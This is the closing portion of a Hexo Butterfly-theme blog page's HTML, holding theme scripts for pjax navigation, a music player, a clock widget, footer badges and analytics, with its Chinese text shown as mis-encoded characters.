src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU,å¤ªæ¯›" data-fontsize="15px" data-random="false" async></script><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="/js/Meting.min.js"></script><script src="https://npm.elemecdn.com/pjax/pjax.min.js"></script><script>let pjaxSelectors=["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"]):not([href="/bb/"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.removeEventListener("scroll",window.tocScrollFn),window.removeEventListener("scroll",scrollCollect),"object"==typeof preloader&&preloader.initLoading(),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","UA-214297516-1",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll(),"object"==typeof preloader&&preloader.endLoading()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="app-refresh" id="app-refresh" style="position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease"><div class="app-refresh-wrap" style="display:flex;color:#fff;height:100%;align-items:center;justify-content:center"><label>âœ¨ h-t-m æ›´æ–°äº† ğŸ‘‰</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color:#fff;text-decoration:underline;cursor:pointer">ğŸ‘¨â€ğŸ’»ç«‹å³åˆ·æ–°ğŸ‘Œ</span></a></div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"âœ¨ h-t-m æ›´æ–°äº† ğŸ‘‰",backgroundColor:t,duration:5e5,pos:e,actionText:"ğŸ‘¨â€ğŸ’»ç«‹å³åˆ·æ–°ğŸ‘Œ",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",(function(){showNotification()})),window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})))</script></div><script>var fdata={apiurl:"https://fcircle-h-t-m.vercel.app/api",initnumber:20,stepnumber:10,error_img:"https://cdn.jsdelivr.net/npm/akilar-candyassets/image/404.gif"};localStorage.setItem("fdatalist",JSON.stringify(fdata))</script><script defer src="https://cdn.jsdelivr.net/npm/hexo-filter-fcircle/assets/js/fetch.min.js"></script><script data-pjax>function butterfly_clock_injector_config(){var l=document.getElementsByClassName("sticky_layout")[0];console.log("å·²æŒ‚è½½butterfly_clock"),l.insertAdjacentHTML("afterbegin",'<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/images/~logo.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_clock_injector_config()</script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>function butterfly_footer_beautify_injector_config(){var t=document.getElementById("footer-wrap");console.log("å·²æŒ‚è½½butterfly_footer_beautify"),t.insertAdjacentHTML("beforeend",'<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="åšå®¢æ¡†æ¶ä¸ºHexo_v5.4.0" title=""><img src="https://pic.h-t-m.ltd/img/Frame-Hexo.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="ä¸»é¢˜ç‰ˆæœ¬Butterfly_v3.8.2" title=""><img src="https://pic.h-t-m.ltd/img/Theme-Butterfly.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="æœ¬ç«™é»˜è®¤çº¿è·¯æ‰˜ç®¡äºVercel" title=""><img src="https://pic.h-t-m.ltd/img/Hosted-Vercel.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="æœ¬ç«™é¡¹ç›®ç”±Gtihubæ‰˜ç®¡" title=""><img src="https://pic.h-t-m.ltd/img/Source-Github.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" style="margin-inline:5px" data-title="æœ¬ç½‘ç«™ç”±åˆæ‹äº‘æä¾› CDN åŠ é€Ÿ / äº‘å‚¨å­˜æœåŠ¡" title=""><img src="https://pic.h-t-m.ltd/img/upyun.svg" alt=""/></a><a class="github-badge" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42011502001415" style="margin-inline:5px" data-title="æœ¬ç«™å·²å®Œæˆå…¬å®‰å¤‡æ¡ˆï¼Œå¤‡æ¡ˆå·é„‚å…¬ç½‘å®‰å¤‡ 42011502001415å·" title=""><img src="https://pic.h-t-m.ltd/img/police-beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="æœ¬ç«™å·²åœ¨å·¥ä¿¡éƒ¨å¤‡æ¡ˆï¼Œå¤‡æ¡ˆå·èµ£ICPå¤‡2021010131å·-2" title=""><img src="https://pic.h-t-m.ltd/img/beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20220223" style="margin-inline:5px" data-title="æœ¬ç«™å·²åœ¨èŒå›½å¤‡æ¡ˆï¼Œå¤‡æ¡ˆå·èŒICPå¤‡20220223å·" title=""><img src="https://pic.h-t-m.ltd/img/moe-beian.svg" alt=""/></a></p>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_footer_beautify_injector_config()</script><script async src="/js/runtime.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script></body></html>